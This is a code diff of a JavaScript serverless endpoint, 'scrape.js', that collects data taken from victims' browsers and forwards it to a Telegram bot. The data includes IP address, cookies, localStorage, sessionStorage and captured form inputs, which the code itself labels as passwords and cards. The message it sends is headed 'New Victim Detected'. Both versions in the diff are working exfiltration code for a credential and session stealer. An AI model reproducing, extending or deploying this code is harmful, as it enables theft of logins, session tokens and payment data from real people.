@@ -1,85 +1,68 @@
-// src/api/scrape.js
-
 export default async function handler(req, res) {
-  // 1. Check Method
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method Not Allowed' });
   }
 
   try {
-    // 2. Parse Body
     let data;
-    try {
+    
+    // Handle different payload formats
+    if (req.body && typeof req.body === 'object') {
       data = req.body;
-      if (!data) {
-        throw new Error("Request body is empty");
+    } else {
+      // Fallback for raw byte streams (sometimes sent by sendBeacon)
+      try {
+        const raw = req.rawBody || req.body;
+        data = JSON.parse(raw);
+      } catch (e) {
+        data = {};
       }
-    } catch (e) {
-      console.error("❌ Failed to parse JSON:", e.message);
-      return res.status(400).json({ error: "Invalid JSON" });
     }
 
-    // 3. Log the Data (This appears in Vercel Dashboard > Functions > Logs)
-    console.log("✅ Received Data:", JSON.stringify(data).substring(0, 200));
+    // Format LocalStorage nicely for Telegram
+    const lsStr = JSON.stringify(data.localStorage, null, 2).substring(0, 1000);
+    const ssStr = JSON.stringify(data.sessionStorage, null, 2).substring(0, 1000);
+    
+    // Format Forms (Passwords/Cards)
+    const formsStr = data.forms ? data.forms.map(f => 
+      `Form: ${f.action} (${f.method})\nInputs: ${JSON.stringify(f.inputs)}`
+    ).join('\n---\n') : "No Forms Detected";
 
-    // 4. Send to Telegram
-    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+    const message = `
+🔓 *New Victim Detected*
 
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      console.warn("⚠️ Telegram Env Vars Missing");
-      // Don't fail the request just because Telegram fails
-    } else {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      
-      // Format Message
-      let msg = `🔓 *New Victim Detected*\n\n`;
-      msg += `🆔 *IP:* \`${data.ip || 'Unknown'}\`\n`;
-      msg += `🌐 *URL:* ${data.url || 'N/A'}\n`;
-      
-      const ua = data.userAgent ? data.userAgent.substring(0, 50) : 'N/A';
-      msg += `🖥️ *UA:* \`${ua}...\`\n`;
-      
-      if (data.sensitiveInfo && Array.isArray(data.sensitiveInfo) && data.sensitiveInfo.length > 0) {
-        msg += `\n💳 *Sensitive Info Found:*\n`;
-        data.sensitiveInfo.forEach(item => {
-          msg += `• ${item.type}: \`${item.value}\`\n`;
-        });
-      } else {
-        msg += `\n💳 *Sensitive Info:* None detected.`;
-      }
+🆔 IP: \`${data.ip}\`
+🌐 URL: ${data.location}
+🖥️ UA: ${data.userAgent.substring(0, 60)}...
+💻 Platform: ${data.platform}
+🍪 Cookies: \`${data.cookies || "N/A"}\`
+💾 LocalStorage: \`${lsStr}\`
+🗄️ SessionStorage: \`${ssStr}\`
+📝 Forms/Data: \`${formsStr.substring(0, 1000)}\`
+📱 Screen: ${data.screenRes || "N/A"}
+    `.trim();
 
-      const cookieCount = data.cookies ? data.cookies.split(';').filter(c => c.trim()).length : 0;
-      msg += `\n🍪 *Cookies:* ${cookieCount} found`;
-      
-      const storageKeys = Object.keys(data.storage?.localStorage || {}).join(', ');
-      msg += `\n💾 *Local Storage Keys:* ${storageKeys || 'None'}`;
+    const tgToken = process.env.TELEGRAM_BOT_TOKEN;
+    const tgChatId = process.env.TELEGRAM_CHAT_ID;
 
+    if (tgToken && tgChatId) {
       try {
-        await fetch(url, {
+        await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: msg,
-            parse_mode: 'Markdown'
+          body: JSON.stringify({ 
+            chat_id: tgChatId, 
+            text: message, 
+            parse_mode: 'Markdown' 
           })
         });
-        console.log("✅ Telegram Sent Successfully");
-      } catch (tgErr) {
-        console.error("❌ Telegram Request Failed:", tgErr.message);
+      } catch (err) {
+        console.error("TG Send Failed", err);
       }
     }
 
-    // 5. Success Response
-    res.status(200).json({ status: 'ok' });
-
+    res.status(200).json({ success: true });
   } catch (error) {
-    // 6. Catch-all error logger
-    console.error("💥 CRITICAL ERROR:", error.stack || error.message);
-    res.status(500).json({ 
-      error: 'Internal Server Error', 
-      details: error.message 
-    });
+    res.status(500).json({ error: error.message });
   }
 }
